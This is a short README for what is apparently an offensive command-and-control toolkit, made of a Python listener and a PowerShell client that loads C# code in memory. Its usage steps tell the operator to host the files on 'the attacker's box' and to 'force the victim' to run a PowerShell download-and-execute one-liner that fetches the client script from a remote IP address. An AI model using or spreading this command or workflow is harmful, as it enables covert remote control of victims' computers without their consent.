# Reverse-C2-Channel
This repo contains custom C2 channel, built with Powershell + C# + Python

# C2 Parts
listener.py is designed for callback handler and server application.
client.ps1 is powershell script which is loading pure C# callback code. The idea is abusing the powershell's ability to arbitrary load and run C# code directly in memory.

# How to use:
1. Open client.ps1 with any text editor and modify your IP / Port
2. Host both listener.py and client.ps1 to the attacker's box or C2 infrastructure server
3. Force the victim to remotely run and execute the powershell script in memory (for example: powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.126.128/client.ps1')")